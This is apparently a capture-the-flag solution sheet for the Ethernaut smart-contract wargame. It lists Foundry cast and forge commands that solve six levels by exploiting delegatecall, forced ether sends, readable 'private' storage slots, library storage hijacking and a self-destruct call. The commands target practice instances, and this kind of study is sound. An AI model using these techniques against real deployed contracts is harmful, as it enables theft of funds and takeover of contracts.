# Ethernaut

## Delegation

```bash
$ cast send <INSTANCE_CONTRACT> "pwn()"
```

## Forge

```bash
# Deploy
$ forge create ForceAttacker --constructor-args <INSTANCE_CONTRACT>

# Attack
$ cast send --value 0.01ether <ATTACKER_CONTRACT>
```

## Vault

```bash
$ PASSWORD=$(cast storage 0x19750Da423914182425B8F16E00A9ADDc6fd493d 1)
$ cast send <INSTANCE_CONTRACT> "unlock(bytes32)" "$PASSWORD"
```

## Privacy

```bash
$ KEY=$(cast storage 0x83B62e11B1ebD2b8a65c4Ff55E61d5201C46a07F 5)
$ cast send <ATTACKER_CONTRACT> "attack(address,bytes32)" <INSTANCE_CONTRACT> "$KEY"
```

## Preservation

```bash
$ cast send <INSTANCE_CONTRACT> "setFirstTime(uint)" <ATTACKER_CONTRACT>
$ cast send <INSTANCE_CONTRACT> "setFirstTime(uint)" 0
```

## Recovery

```bash
$ cast send <TOKEN_ADDRESS> "destroy(address)" <MY_ADDRESS>
$
```
